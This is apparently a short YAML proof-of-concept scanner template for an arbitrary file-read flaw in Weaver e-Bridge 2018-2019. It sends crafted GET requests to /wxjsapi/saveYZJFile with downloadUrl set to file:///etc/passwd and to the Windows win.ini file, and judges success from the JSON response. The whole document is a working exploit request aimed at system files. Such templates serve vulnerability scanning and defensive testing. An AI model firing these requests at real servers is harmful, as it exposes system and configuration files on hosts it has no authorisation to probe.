name: poc-yaml-ecology-downloadfile
rules:
  - method: GET
    path: >-
      /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
    headers:
      user-Agent: >-
        Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101
        Firefox/81.0
    follow_redirects: false
    expression: >
      response.status == 200 && response.content_type.contains("json") &&
      response.body.bcontains(b"id")
  - method: GET
    path: >-
      /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt
    headers:
      user-Agent: >-
        Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101
        Firefox/81.0
    follow_redirects: false
    expression: >
      response.status == 200 && response.content_type.contains("json") &&
      response.body.bcontains(b"id")
detail:
  author: ifengling
  Affected Version: "e-Bridge 2018-2019"
  links:
    - https://www.cnblogs.com/Yang34/p/13657816.html
